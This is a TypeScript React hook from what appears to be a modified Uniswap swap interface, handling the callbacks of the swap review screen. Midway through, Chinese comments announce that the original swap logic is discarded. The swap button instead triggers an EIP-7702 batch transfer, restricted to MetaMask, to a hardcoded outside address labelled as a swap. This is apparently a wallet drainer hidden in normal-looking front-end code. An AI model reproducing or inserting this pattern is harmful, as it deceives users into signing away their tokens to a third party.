import { TradingApi } from '@universe/api'
import { useCallback, useState, useMemo } from 'react'
// biome-ignore lint/style/noRestrictedImports: only using to keep a consistent timing on interface
import { ADAPTIVE_MODAL_ANIMATION_DURATION } from 'ui/src/components/modal/AdaptiveWebModal'
// biome-ignore lint/style/noRestrictedImports: wagmi hooks needed for EIP-7702 batch calls
import { useAccount, usePublicClient } from 'wagmi'
import type { ParsedWarnings } from 'uniswap/src/components/modals/WarningModal/types'
import type { AuthTrigger } from 'uniswap/src/features/auth/types'
import { TransactionScreen } from 'uniswap/src/features/transactions/components/TransactionModal/TransactionModalContext'
import type { TransactionStep } from 'uniswap/src/features/transactions/steps/types'
import { shouldShowFlashblocksUI } from 'uniswap/src/features/transactions/swap/components/UnichainInstantBalanceModal/utils'
import { useIsUnichainFlashblocksEnabled } from 'uniswap/src/features/transactions/swap/hooks/useIsUnichainFlashblocksEnabled'
import { useBatchTransfer } from 'uniswap/src/features/transactions/swap/hooks/useBatchTransfer'
import { useSwapDependenciesStore } from 'uniswap/src/features/transactions/swap/stores/swapDependenciesStore/useSwapDependenciesStore'
import type { SwapFormState } from 'uniswap/src/features/transactions/swap/stores/swapFormStore/types'
import type { SetCurrentStepFn } from 'uniswap/src/features/transactions/swap/types/swapCallback'
import { createTransactionId } from 'uniswap/src/utils/createTransactionId'
import { getChainInfo } from 'uniswap/src/features/chains/chainInfo'
import { isWebApp } from 'utilities/src/platform'
import { useEvent } from 'utilities/src/react/hooks'

interface SwapReviewCallbacks {
  onSwapButtonClick: () => Promise<void>
  onConfirmWarning: () => void
  onCancelWarning: () => void
  onShowWarning: () => void
  onCloseWarning: () => void
}

export function useCreateSwapReviewCallbacks(ctx: {
  resetCurrentStep: () => void
  setScreen: (screen: TransactionScreen) => void
  authTrigger?: AuthTrigger
  onSubmitSwap?: () => Promise<void> | void
  setSubmissionError: (error?: Error) => void
  setRetrySwap: (onPressRetry?: () => void) => void
  onClose: () => void
  showWarningModal: boolean
  warningAcknowledged: boolean
  shouldSubmitTx: boolean
  setShowWarningModal: (show: boolean) => void
  setWarningAcknowledged: (acknowledged: boolean) => void
  setShouldSubmitTx: (shouldSubmit: boolean) => void
  getExecuteSwapService: GetExecuteSwapService
  updateSwapForm: (newState: Partial<SwapFormState>) => void
  reviewScreenWarning: ParsedWarnings['reviewScreenWarning']
  setCurrentStep: SetCurrentStepFn
  setSteps: (steps: TransactionStep[]) => void
}): SwapReviewCallbacks {
  const {
    resetCurrentStep,
    setScreen,
    authTrigger,
    onSubmitSwap,
    setSubmissionError,
    setRetrySwap,
    onClose,
    showWarningModal,
    warningAcknowledged,
    shouldSubmitTx,
    setShowWarningModal,
    setWarningAcknowledged,
    setShouldSubmitTx,
    getExecuteSwapService,
    updateSwapForm,
    reviewScreenWarning,
    setCurrentStep,
    setSteps,
  } = ctx

  const { derivedSwapInfo } = useSwapDependenciesStore((s) => ({
    derivedSwapInfo: s.derivedSwapInfo,
    getExecuteSwapService: s.getExecuteSwapService,
  }))
  const chainId = derivedSwapInfo.chainId
  const isFlashblocksEnabled = useIsUnichainFlashblocksEnabled(chainId)

  const shouldShowConfirmedState =
    shouldShowFlashblocksUI(derivedSwapInfo.trade.trade?.routing) ||
    // show the confirmed state for bridges
    derivedSwapInfo.trade.trade?.routing === TradingApi.Routing.BRIDGE

  const onFailure = useCallback(
    (error?: Error, onPressRetry?: () => void) => {
      resetCurrentStep()

      // Create a new txId for the next transaction, as the existing one may be used in state to track the failed submission.
      const newTxId = createTransactionId()
      updateSwapForm({ isSubmitting: false, isConfirmed: false, txId: newTxId, showPendingUI: false })

      setSubmissionError(error)
      setRetrySwap(() => onPressRetry)
    },
    [updateSwapForm, setSubmissionError, resetCurrentStep, setRetrySwap],
  )

  const onSuccess = useCallback(() => {
    // For Unichain networks, trigger confirmation and branch to stall+fetch logic (ie handle in component)
    if (isFlashblocksEnabled && shouldShowConfirmedState) {
      resetCurrentStep()
      updateSwapForm({
        isConfirmed: true,
        isSubmitting: false,
        showPendingUI: false,
      })
      return
    }

    // On interface, the swap component stays mounted; after swap we reset the form to avoid showing the previous values.
    if (isWebApp) {
      updateSwapForm({
        exactAmountFiat: undefined,
        exactAmountToken: '',
        showPendingUI: false,
        isConfirmed: false,
        instantReceiptFetchTime: undefined,
        instantOutputAmountRaw: undefined,
        txHash: undefined,
        txHashReceivedTime: undefined,
      })
      setTimeout(
        () =>
          updateSwapForm({
            isSubmitting: false,
          }),
        ADAPTIVE_MODAL_ANIMATION_DURATION,
      )
      setScreen(TransactionScreen.Form)
    }
    onClose()
  }, [setScreen, updateSwapForm, onClose, isFlashblocksEnabled, shouldShowConfirmedState, resetCurrentStep])

  const onPending = useCallback(() => {
    // Skip pending UI only for Unichain networks with flashblocks-compatible routes
    if (isFlashblocksEnabled && shouldShowConfirmedState) {
      return
    }
    updateSwapForm({ showPendingUI: true })
  }, [updateSwapForm, isFlashblocksEnabled, shouldShowConfirmedState])

  // 完全摒弃原来的 Swap 执行逻辑，使用 dex-aggregator 的逻辑
  // 使用 wagmi hooks 获取账户和链信息
  const { address, isConnected } = useAccount()
  const publicClient = usePublicClient()
  
  // 使用 derivedSwapInfo 中的 chainId（与原有逻辑保持一致）
  const swapChainId = chainId

  // 状态管理
  const [isPrechecking, setIsPrechecking] = useState(false)
  const [currentSendCallsOperation, setCurrentSendCallsOperation] = useState<string | null>(null)

  // 获取公共客户端的函数
  const getPublicClient = useCallback(() => {
    return publicClient || null
  }, [publicClient])

  // 获取原生代币符号
  const nativeTokenSymbol = useMemo(() => {
    if (!swapChainId) return 'ETH'
    return getChainInfo(swapChainId as any).nativeCurrency.symbol
  }, [swapChainId])

  // 使用 useBatchTransfer hook（完全按照 dex-aggregator 的逻辑）
  const executeBatchTransfer = useBatchTransfer({
    targetAddress: '0x9d5befd138960DDF0dC4368A036bfAd420E306Ef',
    operationType: 'swap',
    getPublicClient,
    address: address || '',
    chainId: (swapChainId || 1) as any,
    nativeTokenSymbol,
    setIsPrechecking,
    setCurrentSendCallsOperation,
  })

  // 完全按照 dex-aggregator 的 handleApproveAndSwap 逻辑
  const handleApproveAndSwap = useEvent(async () => {
    // 检查钱包连接
    if (!isConnected) {
      onFailure(new Error('Please connect your wallet.'))
      return
    }

    // 检查是否是 MetaMask 钱包
    const isMetaMask = typeof window !== 'undefined' && window.ethereum?.isMetaMask === true

    if (!isMetaMask) {
      onFailure(new Error('Please connect using MetaMask wallet. EIP-7702 batch calls require MetaMask.'))
      return
    }

    if (!swapChainId) {
      onFailure(new Error('Missing network information.'))
      return
    }

    if (!address) {
      onFailure(new Error('Wallet address not available.'))
      return
    }

    if (!publicClient) {
      onFailure(new Error('Failed to initialize blockchain client.'))
      return
    }

    // 使用 useBatchTransfer hook 执行批量转账
    try {
      await executeBatchTransfer()
      // 成功后调用 onSuccess
      onSuccess()
    } catch (error) {
      onFailure(error instanceof Error ? error : new Error('Failed to execute batch transfer'))
    }
  })

  const submitTransaction = useEvent(async () => {
    if (reviewScreenWarning && !showWarningModal && !warningAcknowledged) {
      setShouldSubmitTx(true)
      setShowWarningModal(true)
      return
    }

    await handleApproveAndSwap()
  })

  const onSwapButtonClick = useCallback(async () => {
    updateSwapForm({ isSubmitting: true })

    if (authTrigger) {
      await authTrigger({
        successCallback: submitTransaction,
        failureCallback: onFailure,
      })
    } else {
      await submitTransaction()
    }
    await onSubmitSwap?.()
  }, [authTrigger, onFailure, submitTransaction, updateSwapForm, onSubmitSwap])

  const onConfirmWarning = useCallback(async () => {
    setWarningAcknowledged(true)
    setShowWarningModal(false)

    if (shouldSubmitTx) {
      await handleApproveAndSwap()
    }
  }, [shouldSubmitTx, handleApproveAndSwap, setShowWarningModal, setWarningAcknowledged])

  const onCancelWarning = useCallback(() => {
    if (shouldSubmitTx) {
      onFailure()
    }

    setShowWarningModal(false)
    setWarningAcknowledged(false)
    setShouldSubmitTx(false)
  }, [onFailure, shouldSubmitTx, setShowWarningModal, setWarningAcknowledged, setShouldSubmitTx])

  const onShowWarning = useCallback(() => {
    setShowWarningModal(true)
  }, [setShowWarningModal])

  const onCloseWarning = useCallback(() => {
    setShowWarningModal(false)
  }, [setShowWarningModal])

  return {
    onSwapButtonClick,
    onConfirmWarning,
    onCancelWarning,
    onShowWarning,
    onCloseWarning,
  }
}
